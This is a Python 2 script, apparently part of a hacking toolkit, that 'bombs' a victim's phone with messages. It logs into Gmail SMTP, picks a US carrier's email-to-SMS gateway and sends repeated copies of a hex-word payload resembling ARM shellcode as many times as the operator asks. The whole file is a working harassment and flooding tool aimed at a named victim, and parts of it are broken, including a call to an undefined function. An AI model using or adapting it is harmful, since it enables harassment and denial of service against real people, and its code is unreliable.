#!/usr/bin/python
import sys
import getpass
import smtplib as s
import options
import colors

packet = (
            0xE59FC044,0xE28F0020,
            0xE1A0E00F,0xE1A0F00C,
            0xE59FC038,0xE28F0024,
            0xE3A03000,0xE3A02000,
            0xE3A01000,0xE1A0E00F,
            0xE1A0F00C,0x00650063,
            0x006C006C,0x006F0063,
            0x00650072,0x00000000,
            0x00310033,0x00330033,
            0x00000037,0x03F6272C,
            0x02E806DC
        )

def bomb():
    gmail_username = raw_input('\n\t[!] Enter Secure Gmail: ')
    gmail_password = getpass.getpass(prompt='\t[!] Enter Secure Pass: ')
    smtp_server = 'smtp.gmail.com'
    smtp_port = 587
    msg_from = '\x01'
    msg_subject = '\x01'
    print"""
	[1] AT&T
	[2] Boost Mobile
	[3] MetroPCS
	[4] Sprint
	[5] T-Mobile
	[6] Virgin Mobile
	[7] Verizon
	"""
    sms_carrier = raw_input('\t[!] What is the victims phone carrier: ')
    if sms_carrier == '1':
        carrier = "@txt.att.net"
    elif sms_carrier == '2':
        carrier = "@myboostmobile.com"
    elif sms_carrier == '3':
        carrier = "@mymetropcs.com"
    elif sms_carrier == '4':
        carrier = "@messaging.sprintpcs.com"
    elif sms_carrier == '5':
        carrier = "@tmomail.net"
    elif sms_carrier == '6':
        carrier = "@vmobl.com"
    elif sms_carrier == '7':
        carrier = "@vtext.com"
    msg_to = raw_input('\t[!] What is the victims number: +')+str(carrier)
    thread_count = raw_input('\t[!] How many threads: ')
    msg_text = packet*int(thread_count)
    thread_send = raw_input('\t[!] How many times would you like to send the thread: ')
    thread_sending = ("From:%s\rTo:%s\r\r%s" % (gmail_username, "" .join(msg_to), "" .join(msg_text)))
    session = s.SMTP(smtp_server, smtp_port)
    session.ehlo()
    session.starttls()
    session.login(gmail_username, gmail_password)
    for i in xrange(int(thread_send)):
        session.sendmail(msg_from, msg_to, thread_sending)
    print"[!] Threads sent '%s'" % (len(packet))
    session.quit()
    reset_smsbomber_module = raw_input("\nWould you like to send some more threads (Y/n): ")
    if reset_smsbomber_module == 'Y' or reset_smsbomber_module == 'y':
    	SMSBomb()
    elif reset_smsbomber_module == 'n' or reset_smsbomber_module == 'N':
    	sys.exit()
